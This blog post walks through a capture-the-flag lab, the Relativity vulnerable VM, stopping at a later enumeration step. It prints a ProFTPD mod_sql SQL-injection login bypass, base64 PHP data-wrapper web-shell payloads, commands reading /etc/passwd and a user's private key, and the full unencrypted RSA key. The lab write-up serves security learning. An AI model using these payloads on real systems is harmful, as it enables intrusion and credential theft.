
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>#!/slash/note</title>
  <meta name="author" content="Leon Jacobs">

  
  <meta name="description" content="foreword At the time of writing this post, this VM was part of a local security communities (zacon) pre-con challenge. Finding /root/flag.txt would &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://leonjza.github.io/posts/4">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="#!/slash/note" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-44457032-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">#!/slash/note</a></h1>
  
    <h2>A checkbox unchecker's notepad</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:leonjza.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/">/root/flag.txt - Solving the Relativity Vulnerable VM</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-18T06:47:00+02:00" pubdate data-updated="true">Nov 18<sup>th</sup>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>foreword</h2>

<p>At the time of writing this post, this VM was part of a local security communities (<a href="http://zacon.org.za/">zacon</a>) pre-con challenge. Finding /root/flag.txt would have entered you into a draw for winning a prize :D However, the greater goal of the challenge was to learn something. I set out some time and attempted the challenge. Fortunately, I managed to complete it in time. So, this is the journey I took to solve this. You can now download and try this VM yourself over at <a href="http://vulnhub.com/entry/devrandom_relativity,55/">VulnHub</a>. Unzip, mount and boot the VM. Once the VM is booted, it should have an IP assigned via DHCP.</p>

<p>I think it is interesting to note that I used a very limited set of tools to complete this. No bruteforcers, metasploits, vulnerability scanners and or fancy proxies were used. My toolset consisted out of netcat, nmap and other basic bash commands. There are probably a gazillion ways to do this as lots of this stuff is preference based on how they are approached. However, the basic ideas of the vulnerabilities remain the same.</p>

<h3>the challenge</h3>

<p>It all started with an announcement on the Zacon mailing list. A friendly heads-up about the challenge and some details were made available. We were given a hostname of where the challenge lived with clear instructions to find <code>flag.txt</code>. Sounds simple. I slapped the hostname as a url in a browser and was met with a image of M.C. Eshter&rsquo;s &lsquo;Relativity&rsquo;. Great. Something to start thinking about. I also nmapped the box. I mean, how else would you start, right? :)</p>

<figure class='code'><figcaption><span>192.168.56.21 Nmap</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.21 <span class="o">(</span>192.168.56.21<span class="o">)</span>
</span><span class='line'>Host is up <span class="o">(</span>0.0024s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 997 filtered ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>21/tcp open  ftp
</span><span class='line'>22/tcp open  ssh
</span><span class='line'>80/tcp open  http
</span></code></pre></td></tr></table></div></figure>


<p>Alright. This gives you a good idea of whats happening on the host, as well as some points to start off with.</p>

<h3>initial enumeration</h3>

<p>Enumeration is key to starting something like this. The more you know about the host, the more you are able to adapt and think about as you go through the challenge. So, we know we have a SSH Server, a FTP server and a Web server exposed.</p>

<p>Starting with the SSH server, I tried to check if password based authentication was on. Maybe Mr MC Eshter had an account on this box? You never know :)</p>

<figure class='code'><figcaption><span>SSH Login</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ssh eshter@192.168.56.21</span>
</span><span class='line'>Permission denied <span class="o">(</span>publickey<span class="o">)</span>.
</span></code></pre></td></tr></table></div></figure>


<p>So, we now know only key based authentication works. Thats fine. Next up was the FTP service.</p>

<figure class='code'><figcaption><span>FTP Login</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ftp 192.168.56.21</span>
</span><span class='line'>Connected to 192.168.56.21.
</span><span class='line'>220 Welcome to Relativity FTP <span class="o">(</span>mod_sql<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>192.168.56.21:root<span class="o">)</span>: anonymous
</span><span class='line'>331 Password required <span class="k">for </span>anonymous.
</span><span class='line'>Password:
</span><span class='line'>530 Login incorrect.
</span><span class='line'>Login failed.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt;
</span></code></pre></td></tr></table></div></figure>


<p>No anonymous FTP logins either. It appears that the Server&rsquo;s FTP banner has been customised and is maybe using the mod_sql plugin. A quick Google for mod_sql revealed that this may be ProFTPD with the mod_sql plugin. Great. This is an important piece of information. To complete the enumeration I moved on to the web server. It was time to inspect some request responses.</p>

<figure class='code'><figcaption><span>Apache tokens.</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># curl -v 192.168.56.21</span>
</span><span class='line'>* About to connect<span class="o">()</span> to 192.168.56.21 port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>*   Trying 192.168.56.21...
</span><span class='line'>* connected
</span><span class='line'>* Connected to 192.168.56.21 <span class="o">(</span>192.168.56.21<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET / HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: 192.168.56.21
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt;
</span><span class='line'>* additional stuff not fine transfer.c:1037: 0 0
</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'>&lt; HTTP/1.1 200 OK
</span><span class='line'>&lt; Date: Sat, 28 Sep 2013 23:12:28 GMT
</span><span class='line'>&lt; Server: Apache/2.2.23 <span class="o">(</span>Fedora<span class="o">)</span>
</span><span class='line'>&lt; Last-Modified: Tue, 05 Mar 2013 03:24:29 GMT
</span><span class='line'>&lt; ETag: <span class="s2">&quot;4ecb-82-4d72502eec502&quot;</span>
</span><span class='line'>&lt; Accept-Ranges: bytes
</span><span class='line'>&lt; Content-Length: 130
</span><span class='line'>&lt; Connection: close
</span><span class='line'>&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</span><span class='line'>&lt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;&lt;title&gt;M.C. Escher - Relativity&lt;/title&gt;&lt;/head&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;/br&gt;
</span><span class='line'>&lt;center&gt;&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;artwork.jpg&quot;</span>&gt;&lt;/center&gt;
</span><span class='line'>&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span><span class='line'>* Closing connection <span class="c">#0</span>
</span></code></pre></td></tr></table></div></figure>


<h4>putting the enumeration together</h4>

<p>With the little bit of poking around we have just done, we are able to say that this may be a Fedora Core Server, running Apache 2.2.13, with ProFTPD and the mod_sql plugin. This already gives us quite a lot to work with in the sense of researching the respective software in search of known vulnerabilities.</p>

<p>With me loving web based security, my first attempt at further enumerating the machine was via the web server. I searched for <code>cgi-bin/</code> type problems, potentially hidden directories via <code>robots.txt</code>, username enumeration via home directories etc. to no avail. At some stage it became very apparent that the initial entry point for this server was not via the Web.</p>

<h3>the initial attack</h3>

<p>The next step was the FTP server. As it was purposely disclosing the fact that it was using mod_sql, instinct kicked in and I attempted to check the responses if I tried to login with username <strong>&lsquo;</strong> and password <strong>&rsquo;</strong>.</p>

<figure class='code'><figcaption><span>mod_sql SQLi attempt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ftp 192.168.56.21</span>
</span><span class='line'>Connected to 192.168.56.21.
</span><span class='line'>220 Welcome to Relativity FTP <span class="o">(</span>mod_sql<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>192.168.56.21:root<span class="o">)</span>: <span class="s1">&#39;</span>
</span><span class='line'><span class="s1">331 Password required for &#39;</span>.
</span><span class='line'>Password:
</span><span class='line'>421 Service not available, remote server has closed connection
</span><span class='line'>Login failed.
</span><span class='line'>No control connection <span class="k">for </span><span class="nb">command</span>: Success
</span><span class='line'>ftp&gt;
</span></code></pre></td></tr></table></div></figure>


<p>As you can clearly see, the response does differ from when I initially attempted to login as anonymous. This highly suggests that one of the fields is SQL injectable. And so, it was research time. Using good &lsquo;ol trusty Google, I searched for <em>proftpd mod_sql injection vulnerability</em>. Hey presto! The very first hit describes a vulnerability <a href="http://www.securityfocus.com/bid/33722">disclosed</a> in 2009.</p>

<p>From this research, we can be pretty confident in thinking that this specific FTP server may as well be vulnerable to the exact same vulnerability, and may very well be our first entry point into the system. Sample exploits are available <a href="http://www.securityfocus.com/bid/33722/exploit">here</a>, and as such I attempted to exploit this. I copied the SQLi payload from the website <code>%') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --</code> and pasted this as the username, whereafter I provided 1 as the password.</p>

<figure class='code'><figcaption><span>mod_sql SQLi attempt 2</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ftp 192.168.56.21</span>
</span><span class='line'>Connected to 192.168.56.21.
</span><span class='line'>220 Welcome to Relativity FTP <span class="o">(</span>mod_sql<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>192.168.56.21:root<span class="o">)</span>: %<span class="s1">&#39;) and 1=2 union select 1,1,uid,gid,homedir,shell from users; --</span>
</span><span class='line'><span class="s1">331 Password required for %&#39;</span><span class="o">)</span>.
</span><span class='line'>Password:
</span><span class='line'>421 Service not available, remote server has closed connection
</span><span class='line'>Login failed.
</span><span class='line'>No control connection <span class="k">for </span><span class="nb">command</span>: Success
</span><span class='line'>ftp&gt; bye
</span></code></pre></td></tr></table></div></figure>


<p>No dice. :| Ok, well I guess I couldn&rsquo;t have expected it to be <em>that</em> easy. This caused me to dig even deeper and research exactly what the problem is, and why this vulnerability exists. Eventually, I got hold of a vulnerable version of the software, set it up in a LAB VM, and tested the SQLi payload until it worked. I ended up with a slightly different payload to the ones available online.</p>

<figure class='code'><figcaption><span>mod_sql SQLi success</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ftp 192.168.56.21</span>
</span><span class='line'>Connected to 192.168.56.21.
</span><span class='line'>220 Welcome to Relativity FTP <span class="o">(</span>mod_sql<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>192.168.56.21:root<span class="o">)</span>: %<span class="s1">&#39;) and 1=2 union select 1,1,uid,gid,homedir,shell from users;#</span>
</span><span class='line'><span class="s1">331 Password required for %&#39;</span><span class="o">)</span>.
</span><span class='line'>Password:
</span><span class='line'>230 User %<span class="err">&#39;</span><span class="o">)</span> and <span class="nv">1</span><span class="o">=</span>2 union <span class="k">select </span>1,1,uid,gid,homedir,shell from users<span class="p">;</span><span class="c"># logged in.</span>
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt;
</span></code></pre></td></tr></table></div></figure>


<p>w00t. Notice the difference though? The SQL commenting was changed from &mdash; to #. Apparently, MySQL is pretty finicky about the fact that the &mdash; style comments should have a space afterwards. This means that a payload ending with say, <code>from users; -- NOTHING_OF_VALUE</code> would have worked too. Just putting a space after the &mdash; did not work as the software most probably does a type of <code>trim()</code> on the field, hence the need to have something after the space too. Awesome, something learnt.</p>

<h3>web based attack</h3>

<p>Now that we have FTP access to the host, we simply needed to <code>ls</code> to learn what is the next step.</p>

<figure class='code'><figcaption><span>FTP Web Directory Reveal&#8220;`</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>ftp&gt; ls
</span><span class='line'>200 PORT <span class="nb">command </span>successful
</span><span class='line'>150 Opening ASCII mode data connection <span class="k">for </span>file list
</span><span class='line'>drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
</span><span class='line'>-rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
</span><span class='line'>-rw-r--r--   1 root     root          130 Mar  5  2013 index.html
</span><span class='line'>226 Transfer complete.
</span><span class='line'>ftp&gt; <span class="nb">cd </span>0f756638e0737f4a0de1c53bf8937a08
</span><span class='line'>550 0f756638e0737f4a0de1c53bf8937a08: Permission denied
</span><span class='line'>ftp&gt;
</span></code></pre></td></tr></table></div></figure>


<p>A directory called &lsquo;0f756638e0737f4a0de1c53bf8937a08&rsquo; was present, however our FTP user does not have access to this. We are able to deduce that this is in the web folder based on the content of the directory we have access to. So, time to slap <a href="http://192.16.56.21/0f756638e0737f4a0de1c53bf8937a08">http://192.16.56.21/0f756638e0737f4a0de1c53bf8937a08</a> into a web browser.</p>

<h3>exploiting the web based vulnerability</h3>

<p>Browsing to the above mentioned URL revealed a PHP driven website filled with information about the Relativity artwork. While this in itself was interesting, the real interest was in the url&rsquo;s to different parts of the website. More specifically, the urls were composed as <code>index.php?page=definition.php</code>. Immediately this suggested that the file <code>index.php</code> was programmed to include other files in order to render the content. In the examples case it included definition.php.</p>

<p>My first attempts to exploit this was very successful. For this kind of potential vulnerability, I have a small PHP <a href="http://php.net/manual/en/wrappers.data.php">data stream wrapper</a> shell in my toolbox. Normally, the shell looks something like this:</p>

<figure class='code'><figcaption><span>PHP Data stream Wrapper Shell</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">?</span><span class="nb">file</span><span class="o">=</span><span class="nx">data</span><span class="o">:</span><span class="p">,</span><span class="o">&lt;?</span><span class="nx">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">c</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&amp;c=ls</span>
</span></code></pre></td></tr></table></div></figure>


<p>Sometimes however, sites tend to attempt to filter out certain PHP commands. So, in order to increase the chances of success, a base64 encoded version ends up being my favourite:</p>

<figure class='code'><figcaption><span>Base 64 Encoded Data stream Wrapper Shell</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">?</span><span class="nb">file</span><span class="o">=</span><span class="nx">data</span><span class="o">:</span><span class="p">;</span><span class="nx">base64</span><span class="p">,</span><span class="nx">PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4</span><span class="o">=&amp;</span><span class="nx">c</span><span class="o">=</span><span class="nx">dir</span>
</span></code></pre></td></tr></table></div></figure>


<p>I used this and now had shell access to the box. Remembering the basic tips of enumerate->exploit->post-exploit, I ran a few simple commands, just to get a better feel for the environment that I was facing. I was using Google Chrome. If you add &lsquo;view-source:&rsquo; to the front of a url, or right click-> view source, then you will see the output for your command shell in a much neater and easier to read layout. I ran the commands <code>id; uname -a; sestatus; pwd; ls -lah /home; cat /etc/passwd</code>:</p>

<p><img src="http://i.imgur.com/pnBHjXv.png"></p>

<p>From this we know that the server is running Fedora Core 17, with the 3.9.8-100 kernel. SELinux is disabled. There are 2 users with /home directories, of which <code>jetta</code>&rsquo;s directory is protected from me reading it at the moment. root, mauk and jetta all have valid logins shells too.</p>

<p>Taking one quick step back, I investigated the sources of the website in order to maybe find some credentials that may attach this website to a database or something similarly useful. While doing this, I noticed the index.php page was in fact doing partial input validation, which may cause some web shells not to work :)</p>

<figure class='code'><figcaption><span>Hidden site index validation</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$blacklist_include</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;php://&quot;</span><span class="p">);</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$blacklist_include</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'>         <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">],</span><span class="nv">$blacklist_include</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">!==</span> <span class="k">false</span><span class="p">){</span>
</span><span class='line'>                <span class="k">die</span><span class="p">();</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">];</span>
</span><span class='line'><span class="k">include</span> <span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<h3>gaining further access</h3>

<p>From here you can of course take the time to set yourself up with a very nice interactive shell using this web based remote file inclusion vulnerability. However, browsing around the file system its clear that you can browse in the user <code>mauk</code>&rsquo;s home directory. While the directory itself has nothing of real value, there are still the hidden directories to view. Usually, these include things such as the users bash_history, bashrc etc. Also, ssh key related information would typically reside inside .ssh/. In this users .ssh/ directory, he left he’s SSH private key there, with permissions set so that anyone can read it. So, using the web based remote file include shell we are able to steal this off the server with the command <code>cat /home/mauk/.ssh/id_rsa</code>, which would echo us the key.</p>

<figure class='code'><figcaption><span>User mauk&#8217;s private SSH key:</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
</span><span class='line'>9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
</span><span class='line'>5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
</span><span class='line'>zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
</span><span class='line'>ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
</span><span class='line'>xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
</span><span class='line'>tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
</span><span class='line'>jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
</span><span class='line'>f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
</span><span class='line'>r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
</span><span class='line'>Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
</span><span class='line'>BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
</span><span class='line'>MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
</span><span class='line'>szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
</span><span class='line'>YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
</span><span class='line'>+Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
</span><span class='line'>3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
</span><span class='line'>Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
</span><span class='line'>3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
</span><span class='line'>ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
</span><span class='line'>dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
</span><span class='line'>J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
</span><span class='line'>ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
</span><span class='line'>bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
</span><span class='line'>aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg<span class="o">==</span>
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span></code></pre></td></tr></table></div></figure>


<p>What is particularly important to note here is the fact that this private key is not password protected. Usually, password protected keys would have a line such as <code>Proc-Type: 4,ENCRYPTED</code> indicating this. This key does not. So, using this, it would be as easy as specifying a private key to use when connecting and viola. I saved the the contents of <code>id_rsa</code> to a file called <code>key</code>, and specified it to be used when connecting with the <code>-i</code> flag:</p>

<figure class='code'><figcaption><span>SSH access as mauk</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ssh mauk@192.168.56.21 -i key</span>
</span><span class='line'><span class="o">[</span>mauk@Relativity ~<span class="o">]</span><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mauk<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mauk<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>mauk<span class="o">)</span>
</span><span class='line'><span class="o">[</span>mauk@Relativity ~<span class="o">]</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>w00t. Now, we have a proper interactive shell as the user <code>mauk</code>! :)</p>

<h3>enumerating the next step</h3>

<p>Again, enumerate->exploit->post-exploit are very important steps. Now we find ourselves at the post-exploitation part again. Learn as much as you can about everything you can. Having the interactive SSH session that we have now, it was a breeze to learn quite a lot about the server. More importantly, learning about that which we also don’t have access to.</p>

<p>Enumeration is not just about files and the access. It also includes network interfaces, configuration etc. In the user <code>mauk</code>&rsquo;s case, he had a .bash_history file, which revealed the key to the next part of the challenge. I also noticed port 6667 (irc) being open locally along with a ircd running as the user jetta.</p>

<figure class='code'><figcaption><span>Mauks bash_history</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>mauk@Relativity ~<span class="o">]</span><span class="nv">$ </span>cat .bash_history
</span><span class='line'>
</span><span class='line'>ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N
</span><span class='line'>su -
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'>su -
</span><span class='line'><span class="o">[</span>mauk@Relativity ~<span class="o">]</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


